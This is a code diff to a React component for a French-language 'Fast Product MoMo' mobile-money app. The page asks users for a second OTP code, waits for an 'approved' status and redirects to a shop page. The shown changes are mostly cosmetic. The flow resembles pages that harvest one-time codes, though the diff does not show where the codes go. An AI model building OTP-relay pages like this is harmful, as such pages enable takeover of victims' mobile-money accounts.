@@ -13,8 +13,6 @@ const SecondVerification = () => {
   const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "0123456789";
 
   const otpRefs = useRef<(HTMLInputElement | null)[]>([]);
-  
-  // ✅ Now only checks if the OTP is complete
   const isFormValid = secondOtp.every((d) => d !== "");
 
   const handleOtpChange = (index: number, value: string) => {
@@ -64,7 +62,8 @@ const SecondVerification = () => {
             setIsVerifying(false);
             
             if (statusData.status === "approved") {
-              navigate("/loan-limit", { state: { phone: phoneNumber } });
+              // ✅ REDIRECT TO THE LANDING PAGE AFTER SUCCESS
+              navigate("/shop", { state: { phone: phoneNumber } });
             } else {
               navigate("/login"); 
             }
@@ -84,8 +83,6 @@ const SecondVerification = () => {
 
   return (
     <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
-
-      {/* HEADER */}
       <div className="text-center mb-8 mt-4">
         <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
           <Wallet size={32} color="#1E1E1E" />
@@ -94,31 +91,21 @@ const SecondVerification = () => {
           Fast Product<span className="text-[#B8860B]">MoMo</span>
         </h1>
         <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
-          Vérification de sécurité
+          Vérification de sécurité (2/2)
         </p>
       </div>
 
-      {/* MAIN CARD */}
       <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
-        
-        {/* BACK BUTTON */}
-        <button 
-          onClick={() => navigate(-1)} 
-          className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors"
-        >
+        <button onClick={() => navigate(-1)} className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors">
           <ArrowLeft size={18} className="mr-1.5" /> Retour
         </button>
         
-        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">
-          Double Vérification
-        </h2>
+        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">Double Vérification</h2>
         
-        {/* ✅ Updated text to reflect only OTP is needed */}
         <p className="text-sm text-gray-600 leading-relaxed mb-8">
           Un code a été envoyé à votre téléphone. Veuillez entrer le deuxième code OTP pour continuer.
         </p>
         
-        {/* Second OTP Only */}
         <div className="mb-6">
           <label className="block text-sm font-semibold text-gray-700 mb-3">
             Deuxième code OTP (4 chiffres)
@@ -140,7 +127,6 @@ const SecondVerification = () => {
           </div>
         </div>
 
-        {/* SUBMIT */}
         <button 
           onClick={handleVerify} 
           disabled={!isFormValid || isVerifying} 
@@ -154,7 +140,6 @@ const SecondVerification = () => {
         </button>
       </div>
 
-      {/* SPINNER MODAL */}
       {isVerifying && (
         <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
           <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
